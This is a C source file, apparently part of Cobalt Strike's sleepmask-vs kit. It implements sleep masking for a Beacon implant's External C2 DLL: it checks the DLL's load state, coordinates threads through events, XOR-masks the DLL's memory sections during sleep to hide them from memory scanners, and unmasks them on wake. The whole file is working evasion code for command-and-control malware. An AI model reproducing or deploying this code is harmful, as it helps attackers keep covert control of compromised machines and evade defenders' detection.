#include <windows.h>

#include "../beacon.h"
#include "../base/helpers.h"
#include "../debug.h"
#include "../sleepmask.h"
#include "../sleepmask-vs.h"

/**
* Check whether the Beacon is an extc2-loader Beacon
*
* Note: This is very specific to the extc2-loader
* example in UDRL-VS. 
*
* @param info A pointer to the SLEEPMASK_INFO structure
* @param customUserData A pointer to a CUSTOM_USER_DATA structure
* @return The state of the External C2 DLL
*/
EXTC2_DLL_STATE GetExternalC2DllState(PSLEEPMASK_INFO info, PCUSTOM_USER_DATA customUserData) {
    DFR_LOCAL(KERNEL32, WaitForSingleObject);

    // Check if the External C2 DLL has been loaded by the extc2-loader
    static EXTC2_DLL_STATE extC2DllState = EXTC2_DLL_EMPTY;
    
    if (extC2DllState == EXTC2_DLL_EMPTY) {
        PALLOCATED_MEMORY_REGION extC2Memory = FindRegionByPurpose(&info->beacon_info.allocatedMemory, ExternalC2);
        if (extC2Memory == NULL) {
            extC2DllState = EXTC2_DLL_NOT_LOADED;
        }
        else  {
            DLOG("SLEEPMASK: External C2 DLL loaded\n");
            extC2DllState = EXTC2_DLL_LOADED;
        }
    }

    // If the External C2 is loaded, check if the ExtC2Init event has been signalled
    if (extC2DllState == EXTC2_DLL_LOADED) {
        DWORD waitStatus = WaitForSingleObject(((PEXTC2_SYNC_INFO)customUserData)->ExtC2Init, 0);
        if (waitStatus == WAIT_OBJECT_0) {
            DLOG("SLEEPMASK: ExtC2Init event signalled\n");
            extC2DllState = EXTC2_DLL_INITIALIZED;
        }
        else if (waitStatus == WAIT_FAILED) {
            /* 
            * WaitForSingleObject will return WAIT_FAILED if the handle is no longer valid.
            * This indicates the External C2 DLL has failed to connect and exited.
            */
            extC2DllState = EXTC2_DLL_NOT_INITIALIZED;
        }
    }
    return extC2DllState;
}

/**
* Synchronize the External C2 and Beacon threads and apply
* masking to the External C2 Dll.
*
* Note: This is very specific to the extc2-loader
* example in UDRL-VS.
*
* @param info A pointer to the SLEEPMASK_INFO structure
* @param customUserData A pointer to a CUSTOM_USER_DATA structure
*/
void ExternalC2Sleep(PSLEEPMASK_INFO info, PCUSTOM_USER_DATA customUserData) {
    DFR_LOCAL(KERNEL32, ExitThread);
    DFR_LOCAL(KERNEL32, Sleep);
    DFR_LOCAL(KERNEL32, WaitForSingleObject);
    DFR_LOCAL(KERNEL32, SetEvent);

    PALLOCATED_MEMORY_REGION extC2Memory = FindRegionByPurpose(&info->beacon_info.allocatedMemory, ExternalC2);
    if (extC2Memory == NULL) {
        DLOGF("SLEEPMASK: ExtC2Sleep - Unable to find External C2 Region. Exiting.\n");
        return;
    }

    // Signal External C2 DLL to wait
    DLOGF("SLEEPMASK: ExtC2Sleep - Set Stop event\n");
    SetEvent(((PEXTC2_SYNC_INFO)customUserData)->ExtC2StopEvent);

    /*
    * Wait for External C2 DLL to signal its waiting
    * 
    * Note: Here we use a timeout interval of 30 seconds.
    * This provides plenty of time for the extc2-dll to signal
    * the event. However, if a timeout occurs it also provides 
    * a good indication that the extc2-dll has failed.
    */ 
    DLOGF("SLEEPMASK: ExtC2Sleep - Waiting for External C2 thread to sleep...\n");
    DWORD waitStatus = WaitForSingleObject(((PEXTC2_SYNC_INFO)customUserData)->ExtC2SleepEvent, 30000);
    if (waitStatus == WAIT_OBJECT_0) {
        DLOGF("SLEEPMASK: ExtC2Sleep - External C2 thread sleeping\n");

        /* 
        * A small sleep before masking to ensure the External C2 thread
        * is in the waiting state.
        */
        Sleep(500);

        // Mask External C2 DLL
        DLOGF("SLEEPMASK: ExtC2Sleep - Masking... \n");
        XORSections(extC2Memory, info->beacon_info.mask, TRUE);

        // Sleep
        Sleep(3000);

        // UnMask External C2 DLL
        DLOGF("SLEEPMASK: ExtC2Sleep - Unmasking... \n");
        XORSections(extC2Memory, info->beacon_info.mask, FALSE);

        DLOGF("SLEEPMASK: ExtC2Sleep - Set Continue event\n");
        SetEvent(((PEXTC2_SYNC_INFO)customUserData)->ExtC2ContinueEvent);
    }
    else if (waitStatus == WAIT_TIMEOUT || waitStatus == WAIT_FAILED){
        DLOGF("SLEEPMASK: ExtC2Sleep - Calling ExitThread()\n");
        UnMaskBeacon(&info->beacon_info);
        ExitThread(0);
    }

    return;
}
